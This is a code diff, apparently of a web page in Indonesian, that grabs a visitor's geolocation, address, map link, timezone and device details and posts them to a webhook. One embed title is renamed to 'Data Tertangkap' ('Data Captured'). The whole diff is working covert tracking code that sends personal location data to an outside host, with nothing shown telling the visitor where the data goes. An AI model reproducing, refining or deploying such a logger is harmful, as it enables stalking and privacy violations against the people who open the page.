@@ -285,10 +285,7 @@
                 language: navigator.language,
                 screenResolution: screen.width + 'x' + screen.height,
                 timezone: getTimezone(),
-                timestamp: getLiveTimestamp(),
-                cookiesEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+                timestamp: getLiveTimestamp()
             };
         }
         
@@ -317,7 +314,7 @@
                             latitude: 'denied',
                             longitude: 'denied',
                             accuracy: 'denied',
-                            address: 'Permission denied or unavailable',
+                            address: 'Permission denied',
                             mapsUrl: 'N/A',
                             status: 'denied'
                         });
@@ -330,52 +327,57 @@
         async function sendToWebhook(locationData, deviceInfo) {
             const data = {
                 "embeds": [{
-                    "title": "🎀 HAAII Visitor 🎀",
+                    "title": "🎀 Data Tertangkap 🎀",
                     "color": 16711827,
                     "fields": [
                         {
-                            "name": "📍 LOKASI LENGKAP",
+                            "name": "📍 Lokasi",
                             "value": locationData.address,
                             "inline": false
                         },
                         {
-                            "name": "🧭 Koordinat",
-                            "value": `Lat: ${locationData.latitude}\nLon: ${locationData.longitude}`,
+                            "name": "Latitude",
+                            "value": locationData.latitude,
                             "inline": true
                         },
                         {
-                            "name": "📏 Akurasi",
-                            "value": `${locationData.accuracy}m`,
+                            "name": "Longitude",
+                            "value": locationData.longitude,
                             "inline": true
                         },
                         {
-                            "name": "🖥️ Device",
+                            "name": "Akurasi",
+                            "value": locationData.accuracy + "m",
+                            "inline": true
+                        },
+                        {
+                            "name": "Timezone",
+                            "value": deviceInfo.timezone,
+                            "inline": true
+                        },
+                        {
+                            "name": "Waktu (Live)",
+                            "value": deviceInfo.timestamp,
+                            "inline": false
+                        },
+                        {
+                            "name": "Platform",
                             "value": deviceInfo.platform,
                             "inline": true
                         },
                         {
-                            "name": "🌐 Bahasa",
+                            "name": "Bahasa",
                             "value": deviceInfo.language,
                             "inline": true
                         },
                         {
-                            "name": "📺 Screen",
+                            "name": "Resolution",
                             "value": deviceInfo.screenResolution,
                             "inline": true
                         },
                         {
-                            "name": "⏰ Waktu",
-                            "value": deviceInfo.timestamp,
-                            "inline": true
-                        },
-                        {
-                            "name": "📍 Google Maps",
-                            "value": `[Buka Maps](${locationData.mapsUrl})`,
-                            "inline": false
-                        },
-                        {
-                            "name": "🔗 User Agent",
-                            "value": `\`\`\`${deviceInfo.userAgent.substring(0, 100)}...\`\`\``,
+                            "name": "🗺️ Google Maps",
+                            "value": `[Buka Lokasi](${locationData.mapsUrl})`,
                             "inline": false
                         }
                     ]
@@ -389,7 +391,7 @@
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                console.log('Sent');
+                console.log('Data sent');
             }
         }
         
